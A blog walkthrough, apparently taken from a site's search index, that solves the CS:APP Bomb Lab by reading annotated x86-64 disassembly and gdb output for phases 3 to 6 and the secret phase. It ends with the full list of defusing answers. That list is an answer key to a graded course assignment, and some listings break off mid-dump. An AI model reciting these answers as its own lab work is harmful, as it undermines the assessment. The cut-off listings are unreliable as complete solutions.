\u003cphase_3+123\u003e 0x00400f9f \u003c+92\u003e: mov $0x2aa,%eax // eax = 682 0x00400fa4 \u003c+97\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400fa6 \u003c+99\u003e: mov $0x147,%eax // eax = 327 0x00400fab \u003c+104\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400fad \u003c+106\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x00400fb2 \u003c+111\u003e: mov $0x0,%eax 0x00400fb7 \u003c+116\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400fb9 \u003c+118\u003e: mov $0x137,%eax // eax = 311 // here we compare the second number we input with %eax // they should be the same 0x00400fbe \u003c+123\u003e: cmp 0xc(%rsp),%eax 0x00400fc2 \u003c+127\u003e: je 0x400fc9 \u003cphase_3+134\u003e 0x00400fc4 \u003c+129\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x00400fc9 \u003c+134\u003e: add $0x18,%rsp 0x00400fcd \u003c+138\u003e: retq Read all of the codes and comments carefully above, we know: we should input two numbers the first number is used to goto different branches the second number should be the same with the value in different branches So we get the answer, pick one of them: 0 207 1 311 2 707 3 256 4 389 5 206 6 682 7 327 ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/bomblab/:6:0","tags":null,"title":"Bomblab","uri":"/zh-cn/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"phase_4 Dump of assembler code for function phase_4: 0x0040100c \u003c+0\u003e: sub $0x18,%rsp 0x00401010 \u003c+4\u003e: lea 0xc(%rsp),%rcx 0x00401015 \u003c+9\u003e: lea 0x8(%rsp),%rdx 0x0040101a \u003c+14\u003e: mov $0x4025cf,%esi // \"%d %d\", two numbers 0x0040101f \u003c+19\u003e: mov $0x0,%eax 0x00401024 \u003c+24\u003e: callq 0x400bf0 \u003c__isoc99_sscanf@plt\u003e 0x00401029 \u003c+29\u003e: cmp $0x2,%eax // validates two numbers 0x0040102c \u003c+32\u003e: jne 0x401035 \u003cphase_4+41\u003e // Note: 0x8(%rsp) is the first number, 0xc(%rsp) is the second // here the first number(unsigned) should not big than 0xe 0x0040102e \u003c+34\u003e: cmpl $0xe,0x8(%rsp) 0x00401033 \u003c+39\u003e: jbe 0x40103a \u003cphase_4+46\u003e // below or equal(unsigned) 0x00401035 \u003c+41\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x0040103a \u003c+46\u003e: mov $0xe,%edx // third arg = 14 0x0040103f \u003c+51\u003e: mov $0x0,%esi // second arg = 0 0x00401044 \u003c+56\u003e: mov 0x8(%rsp),%edi // first arg = first n we input 0x00401048 \u003c+60\u003e: callq 0x400fce \u003cfunc4\u003e // here the return number should be 0, or it will boom 0x0040104d \u003c+65\u003e: test %eax,%eax 0x0040104f \u003c+67\u003e: jne 0x401058 \u003cphase_4+76\u003e // here we know the second number should be zero 0x00401051 \u003c+69\u003e: cmpl $0x0,0xc(%rsp) 0x00401056 \u003c+74\u003e: je 0x40105d \u003cphase_4+81\u003e 0x00401058 \u003c+76\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x0040105d \u003c+81\u003e: add $0x18,%rsp 0x00401061 \u003c+85\u003e: retq Dump of assembler code for function func4: 0x00400fce \u003c+0\u003e: sub $0x8,%rsp 0x00400fd2 \u003c+4\u003e: mov %edx,%eax 0x00400fd4 \u003c+6\u003e: sub %esi,%eax 0x00400fd6 \u003c+8\u003e: mov %eax,%ecx 0x00400fd8 \u003c+10\u003e: shr $0x1f,%ecx // shift logical right 31 0x00400fdb \u003c+13\u003e: add %ecx,%eax 0x00400fdd \u003c+15\u003e: sar %eax // shift arithmetic right, default 1 0x00400fdf \u003c+17\u003e: lea (%rax,%rsi,1),%ecx 0x00400fe2 \u003c+20\u003e: cmp %edi,%ecx 0x00400fe4 \u003c+22\u003e: jle 0x400ff2 \u003cfunc4+36\u003e 0x00400fe6 \u003c+24\u003e: lea -0x1(%rcx),%edx 0x00400fe9 \u003c+27\u003e: callq 0x400fce \u003cfunc4\u003e 0x00400fee \u003c+32\u003e: add %eax,%eax 0x00400ff0 \u003c+34\u003e: jmp 0x401007 \u003cfunc4+57\u003e 0x00400ff2 \u003c+36\u003e: mov $0x0,%eax 0x00400ff7 \u003c+41\u003e: cmp %edi,%ecx 0x00400ff9 \u003c+43\u003e: jge 0x401007 \u003cfunc4+57\u003e 0x00400ffb \u003c+45\u003e: lea 0x1(%rcx),%esi 0x00400ffe \u003c+48\u003e: callq 0x400fce \u003cfunc4\u003e 0x00401003 \u003c+53\u003e: lea 0x1(%rax,%rax,1),%eax 0x00401007 \u003c+57\u003e: add $0x8,%rsp 0x0040100b \u003c+61\u003e: retq It’s too complicated, so we translate the func4 to python: # x = edi = first n we input # esi = 0 at first, edx = 14 at first def func4(x: int = 0, esi: int = 0, edx: int = 14) -\u003e int: result = edx - esi ecx = result \u003e\u003e 31 result = (result + ecx) \u003e\u003e 1 ecx = result + esi if ecx \u003c= x: result = 0 if ecx \u003e= x: return result else: # should not entering here! the returning number can't be 0 any more # if x \u003e 7, the program will be here result = func4(x=x, esi=ecx+1, edx=edx) return 2*result + 1 else: result = func4(x=x, esi=esi, edx=ecx-1) return 2*result Read all of the codes and comments above carefully, we know: we should input two numbers, the first one should not big than 14 the second number should be zero The result of func4 must be zero if x \u003e 7, the recursive function returns a non-zero number, boom! we can easily find that if x == 7, the func4 directly return 0 What’s more, we can try cases from 0 to 7, and get the answers(pick one of them): 0 0 1 0 3 0 7 0 ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/bomblab/:7:0","tags":null,"title":"Bomblab","uri":"/zh-cn/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"phase_5(doing) Dump of assembler code for function phase_5: 0x00401062 \u003c+0\u003e: push %rbx 0x00401063 \u003c+1\u003e: sub $0x20,%rsp 0x00401067 \u003c+5\u003e: mov %rdi,%rbx // Canary usage: save %fs:0x28 to 0x18(%rsp) at the beginning // then xor the 0x18(%rsp) at the end to see if someone attacks the program 0x0040106a \u003c+8\u003e: mov %fs:0x28,%rax 0x00401073 \u003c+17\u003e: mov %rax,0x18(%rsp) 0x00401078 \u003c+22\u003e: xor %eax,%eax // eax xor eax = 0 // `string_length` returns the number of characters in a string // the string pointer is passed through %rdi (the content you input before) // to see your string, type `x/s $rdi` // if you are interested, `disas string_length` for more details // you will also find how `\\0` works at the end of a string 0x0040107a \u003c+24\u003e: callq 0x40131b \u003cstring_length\u003e // so here we know we should input 6 characters 0x0040107f \u003c+29\u003e: cmp $0x6,%eax 0x00401082 \u003c+32\u003e: je 0x4010d2 \u003cphase_5+112\u003e //jump if %eax==6 0x00401084 \u003c+34\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x00401089 \u003c+39\u003e: jmp 0x4010d2 \u003cphase_5+112\u003e ---------------------------------------------------------- // Note: rbx is the rdi, namely the element we input before // movzbl: move byte to long (zero expanding) // this means whatever we input, we only use the final byte--according to ascii // eg: we input \"iasdfg\", at first we'll get 105(ascii of character `i`) 0x0040108b \u003c+41\u003e: movzbl (%rbx,%rax,1),%ecx 0x0040108f \u003c+45\u003e: mov %cl,(%rsp) // cl is the last byte of %rcx 0x00401092 \u003c+48\u003e: mov (%rsp),%rdx 0x00401096 \u003c+52\u003e: and $0xf,%edx // get the last 4 bits of %edx(%cl) // x/s 0x4024b0 and get // \"maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?\" // here we use te last 4 bits of %cl, adding 0x4024b0 to get the new character // eg: character `i` gets 9 (105 = 0110 1001, last 4 bits is 9) // then we get the 9th character of the string above, which is `f`(ascii: 102) 0x00401099 \u003c+55\u003e: movzbl 0x4024b0(%rdx),%edx 0x004010a0 \u003c+62\u003e: mov %dl,0x10(%rsp,%rax,1) // value saved in $rsp 0x004010a4 \u003c+66\u003e: add $0x1,%rax 0x004010a8 \u003c+70\u003e: cmp $0x6,%rax 0x004010ac \u003c+74\u003e: jne 0x40108b \u003cphase_5+41\u003e // jump if %rax!=6, loop 0x004010ae \u003c+76\u003e: movb $0x0,0x16(%rsp) 0x004010b3 \u003c+81\u003e: mov $0x40245e,%esi 0x004010b8 \u003c+86\u003e: lea 0x10(%rsp),%rdi // `x/s 0x40245e` we gets \"flyers\", then saved in `%esi` // `strings_not_equal` compare two strings in `%edi` and `%esi` // return 0 if two strings are the same // `disas strings_not_equal` for more details 0x004010bd \u003c+91\u003e: callq 0x401338 \u003cstrings_not_equal\u003e // So here the string saved in 0x10(%rsp) should be the same with \"flyers\" // the index of them in \"maduiersnfotvbyl...\" is `9 15 14 5 6 7` // so we should input 6 characters, the last 4 bits of which should be the values 0x004010c2 \u003c+96\u003e: test %eax,%eax 0x004010c4 \u003c+98\u003e: je 0x4010d9 \u003cphase_5+119\u003e 0x004010c6 \u003c+100\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x004010cb \u003c+105\u003e: nopl 0x0(%rax,%rax,1) 0x004010d0 \u003c+110\u003e: jmp 0x4010d9 \u003cphase_5+119\u003e ------------------------------------------------------- 0x004010d2 \u003c+112\u003e: mov $0x0,%eax 0x004010d7 \u003c+117\u003e: jmp 0x40108b \u003cphase_5+41\u003e 0x004010d9 \u003c+119\u003e: mov 0x18(%rsp),%rax // Canary to make sure 0x18(%rsp) is safe, since we only input 6 characters // Here can be always safe 0x004010de \u003c+124\u003e: xor %fs:0x28,%rax 0x004010e7 \u003c+133\u003e: je 0x4010ee \u003cphase_5+140\u003e 0x004010e9 \u003c+135\u003e: callq 0x400b30 \u003c__stack_chk_fail@plt\u003e 0x004010ee \u003c+140\u003e: add $0x20,%rsp 0x004010f2 \u003c+144\u003e: pop %rbx 0x004010f3 \u003c+145\u003e: retq Read all of the codes and coments above carefully, we know: we should input 6 characters the last 4 bits of which (ascii) should be the 9 15 14 5 6 7 So we can easily get one of the answer: ionefg ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/bomblab/:8:0","tags":null,"title":"Bomblab","uri":"/zh-cn/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"Phase_6 Dump of assembler code for function phase_6: // callee saved registers, make sure do not affect the real value 0x004010f4 \u003c+0\u003e: push %r14 0x004010f6 \u003c+2\u003e: push %r13 0x004010f8 \u003c+4\u003e: push %r12 0x004010fa \u003c+6\u003e: push %rbp 0x004010fb \u003c+7\u003e: push %rbx 0x004010fc \u003c+8\u003e: sub $0x50,%rsp 0x00401100 \u003c+12\u003e: mov %rsp,%r13 0x00401103 \u003c+15\u003e: mov %rsp,%rsi // As we know before, after calling this, (%rsp) is the first number we input // then following the other numbers we input, 4 bytes each 0x00401106 \u003c+18\u003e: callq 0x40145c \u003cread_six_numbers\u003e 0x0040110b \u003c+23\u003e: mov %rsp,%r14 0x0040110e \u003c+26\u003e: mov $0x0,%r12d 0x00401114 \u003c+32\u003e: mov %r13,%rbp // since we move address %rsp to %r13 before, here they have the same value // key: so the first number we input should small than 6 (unsignded) // What's more, when loop back, we'll check the second, the third... // Then all of the numbers should be small than 6 0x00401117 \u003c+35\u003e: mov 0x0(%r13),%eax 0x0040111b \u003c+39\u003e: sub $0x1,%eax 0x0040111e \u003c+42\u003e: cmp $0x5,%eax 0x00401121 \u003c+45\u003e: jbe 0x401128 \u003cphase_6+52\u003e 0x00401123 \u003c+47\u003e: callq 0x40143a \u003cexplode_bomb\u003e ---------------------------------------------------------- // a loop here, same with `for(int r12d = 0, r12d \u003c 6, r12d++)` 0x00401128 \u003c+52\u003e: add $0x1,%r12d 0x0040112c \u003c+56\u003e: cmp $0x6,%r12d // when all the numbers checked: small than 6, we jump to +95 0x00401130 \u003c+60\u003e: je 0x401153 \u003cphase_6+95\u003e 0x00401132 \u003c+62\u003e: mov %r12d,%ebx 0x00401135 \u003c+65\u003e: movslq %ebx,%rax // `movslq`: move 4 bytes to 8 bytes(signed expanding) // here we get the value we input (%rsp + 4 * %rax) // and it should be different with %rbp(the former value we input, 0 at first) 0x00401138 \u003c+68\u003e: mov (%rsp,%rax,4),%eax 0x0040113b \u003c+71\u003e: cmp %eax,0x0(%rbp) 0x0040113e \u003c+74\u003e: jne 0x401145 \u003cphase_6+81\u003e // jump if not zero 0x00401140 \u003c+76\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x00401145 \u003c+81\u003e: add $0x1,%ebx 0x00401148 \u003c+84\u003e: cmp $0x5,%ebx 0x0040114b \u003c+87\u003e: jle 0x401135 \u003cphase_6+65\u003e // loop back // after this loop, all of the values are checked: not zero // and after adding 0x4, `%r13` now starts with the next value we input // eg: we input 1 2 3 4 5 6, and after first loop here, it is `2 3 4 5 6` 0x0040114d \u003c+89\u003e: add $0x4,%r13 0x00401151 \u003c+93\u003e: jmp 0x401114 \u003cphase_6+32\u003e ----------------------------------------------------- // here is a loop again: save 0x18(%rsp) to %rsi // whatever %rsi it is, we'll loop through all of the values we input // then make the number we input = 7 - the number we input // eg: we input 1 2 3 4 5 6, then it will be `6 5 4 3 2 1` 0x00401153 \u003c+95\u003e: lea 0x18(%rsp),%rsi 0x00401158 \u003c+100\u003e: mov %r14,%rax // rax = the numbers we input now 0x0040115b \u003c+103\u003e: mov $0x7,%ecx 0x00401160 \u003c+108\u003e: mov %ecx,%edx 0x00401162 \u003c+110\u003e: sub (%rax),%edx // edx = 7 - the number we input 0x00401164 \u003c+112\u003e: mov %edx,(%rax) 0x00401166 \u003c+114\u003e: add $0x4,%rax // make the pointer plus 4 0x0040116a \u003c+118\u003e: cmp %rsi,%rax 0x0040116d \u003c+121\u003e: jne 0x401160 \u003cphase_6+108\u003e --------------------------------------------------------- 0x0040116f \u003c+123\u003e: mov $0x0,%esi 0x00401174 \u003c+128\u003e: jmp 0x401197 \u003cphase_6+163\u003e // %rdx is the node array, when plus 0x8, it moves to the next node // when %ecx(7 - the number we input) matches, end the loop, // then save the address to `0x20(%rsp,%rsi,2)` by index // eg: %ecx = 6, it will keep going and saved the sixth node(0x603320) // if %ecx = 1, it will just end and saved the second node(0x6032e0) 0x00401176 \u003c+130\u003e: mov 0x8(%rdx),%rdx 0x0040117a \u003c+134\u003e: add $0x1,%eax 0x0040117d \u003c+137\u003e: cmp %ecx,%eax 0x0040117f \u003c+139\u003e: jne 0x401176 \u003cphase_6+130\u003e 0x00401181 \u003c+141\u003e: jmp 0x401188 \u003cphase_6+148\u003e 0x00401183 \u003c+143\u003e: mov $0x6032d0,%edx /* 0x6032d0 \u003cnode1\u003e: 0x0000014c 0x00000001 0x006032e0 0x 0x6032e0 \u003cnode2\u003e: 0x000000a8 0x00000002 0x006032f0 0x 0x6032f0 \u003cnode3\u003e: 0x0000039c 0x00000003 0x00603300 0x 0x603300 \u003cnode4\u003e: 0x000002b3 0x00000004 0x00603310 0x 0x603310 \u003cnode5\u003e: 0x000001dd 0x00000005 0x00603320 0x 0x603320 \u003cnode6\u003e: 0x000001bb 0x00000006 0x 0x */ 0x00401188 \u003c+148\u003e: mov %rdx,0x20(%rsp,%rsi,","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/bomblab/:9:0","tags":null,"title":"Bomblab","uri":"/zh-cn/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"Seems to be the end? secret_phase Haha, secret_phase is waiting for you! By objdump -d bomb \u003e bomb.asm, we can get lots of codes, one thing that is: 00401242 \u003csecret_phase\u003e: 401242: 53 push %rbx .... 401292: c3 retq Let’s see how to enter the secret_phase 004015c4 \u003cphase_defused\u003e: ... 401630: e8 0d fc ff ff callq 401242 \u003csecret_phase\u003e each time when we call for phase_defused, it may enter the secret_phase! Dump of assembler code for function phase_defused: 0x004015c4 \u003c+0\u003e: sub $0x78,%rsp 0x004015c8 \u003c+4\u003e: mov %fs:0x28,%rax 0x004015d1 \u003c+13\u003e: mov %rax,0x68(%rsp) // protect 0x68(%rsp) by Canary 0x004015d6 \u003c+18\u003e: xor %eax,%eax 0x004015d8 \u003c+20\u003e: cmpl $0x6,0x202181(%rip) # 0x603760 \u003cnum_input_strings\u003e // here 0x202181(%rip) gets the value of 0x603760 // this variable stores the number of strings we've input // so after 6 phases, we may enter the secret phase 0x004015df \u003c+27\u003e: jne 0x40163f \u003cphase_defused+123\u003e 0x004015e1 \u003c+29\u003e: lea 0x10(%rsp),%r8 0x004015e6 \u003c+34\u003e: lea 0xc(%rsp),%rcx 0x004015eb \u003c+39\u003e: lea 0x8(%rsp),%rdx 0x004015f0 \u003c+44\u003e: mov $0x402619,%esi 0x004015f5 \u003c+49\u003e: mov $0x603870,%edi // sscanf get the format in %esi, and get the value in %edi // here `x/s 0x402619` we get \"%d %d %s\" and `x/s 0x603870` we get `7 0` // and according to conclusion we get above // the %rax stores the number of elements we input // So, here we know in phase_4, we should not only input 7 0, but also another %s 0x004015fa \u003c+54\u003e: callq 0x400bf0 \u003c__isoc99_sscanf@plt\u003e 0x004015ff \u003c+59\u003e: cmp $0x3,%eax 0x00401602 \u003c+62\u003e: jne 0x401635 \u003cphase_defused+113\u003e 0x00401604 \u003c+64\u003e: mov $0x402622,%esi 0x00401609 \u003c+69\u003e: lea 0x10(%rsp),%rdi // `x/s 0x402622` we get \"DrEvil\" 0x10(%rsp) is now 0x7fffffffe1a0 // `x/s 0x7fffffffe1a0` we know this is the additional string we input // for example, you input 7 0 asd in phase_4, and \"asd\" is saved in 0x10(%rsp) // so now we know the answer: 7 0 DrEvil 0x0040160e \u003c+74\u003e: callq 0x401338 \u003cstrings_not_equal\u003e 0x00401613 \u003c+79\u003e: test %eax,%eax 0x00401615 \u003c+81\u003e: jne 0x401635 \u003cphase_defused+113\u003e 0x00401617 \u003c+83\u003e: mov $0x4024f8,%edi // `x/s 0x4024f8`: \"Curses, you've found the secret phase!\" // function `puts` prints the string 0x0040161c \u003c+88\u003e: callq 0x400b10 \u003cputs@plt\u003e 0x00401621 \u003c+93\u003e: mov $0x402520,%edi // `x/s 0x402520`: \"But finding it and solving it are quite different...\" 0x00401626 \u003c+98\u003e: callq 0x400b10 \u003cputs@plt\u003e 0x0040162b \u003c+103\u003e: mov $0x0,%eax // Congratulations! you now enter the secret_phase! 0x00401630 \u003c+108\u003e: callq 0x401242 \u003csecret_phase\u003e 0x00401635 \u003c+113\u003e: mov $0x402558,%edi // `x/s 0x402558` we get \"Congratulations! You've defused the bomb!\" 0x0040163a \u003c+118\u003e: callq 0x400b10 \u003cputs@plt\u003e 0x0040163f \u003c+123\u003e: mov 0x68(%rsp),%rax 0x00401644 \u003c+128\u003e: xor %fs:0x28,%rax 0x0040164d \u003c+137\u003e: je 0x401654 \u003cphase_defused+144\u003e 0x0040164f \u003c+139\u003e: callq 0x400b30 \u003c__stack_chk_fail@plt\u003e 0x00401654 \u003c+144\u003e: add $0x78,%rsp 0x00401658 \u003c+148\u003e: retq Dump of assembler code for function secret_phase: 0x00401242 \u003c+0\u003e: push %rbx 0x00401243 \u003c+1\u003e: callq 0x40149e \u003cread_line\u003e // after calling this function, %rax saves the string we input 0x00401248 \u003c+6\u003e: mov $0xa,%edx 0x0040124d \u003c+11\u003e: mov $0x0,%esi 0x00401252 \u003c+16\u003e: mov %rax,%rdi 0x00401255 \u003c+19\u003e: callq 0x400bd0 \u003cstrtol@plt\u003e // here `strtol` converts str to long, the value saved in %rax // if the string we input is not a number, %rax will be 0, and explode then // Note: -1 is a very large number in unsigned 0x0040125a \u003c+24\u003e: mov %rax,%rbx 0x0040125d \u003c+27\u003e: lea -0x1(%rax),%eax // here we know the number we input should big than 1, small than 1001 0x00401260 \u003c+30\u003e: cmp $0x3e8,%eax 0x00401265 \u003c+35\u003e: jbe 0x40126c \u003csecret_phase+42\u003e 0x00401267 \u003c+37\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x0040126c \u003c+42\u003e: mov %ebx,%esi 0x0040126e \u003c+44\u003e: mov $0x6030f0,%edi // here %esi is the number we input, %edi is $0x6030f0 (list of node again) // x/120 0x6030f0 /* 0x6030f0 \u003cn1\u003e: 0x00000024 0x00000000 0x00603110 0x00000000 0x603100 \u003cn1+16\u003e: 0x00603130 0x00000000 0x00000000 0x00000000 0x603110 \u003cn21\u003e: 0x00000008 0x00000000 0x00603190 0x","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/bomblab/:10:0","tags":null,"title":"Bomblab","uri":"/zh-cn/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"The results for copy Border relations with Canada have never been better. 1 2 4 8 16 32 6 682 7 0 DrEvil ionefg 4 3 2 1 6 5 22 ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/bomblab/:11:0","tags":null,"title":"Bomblab","uri":"/zh-cn/posts/csapp/bomblab/"}]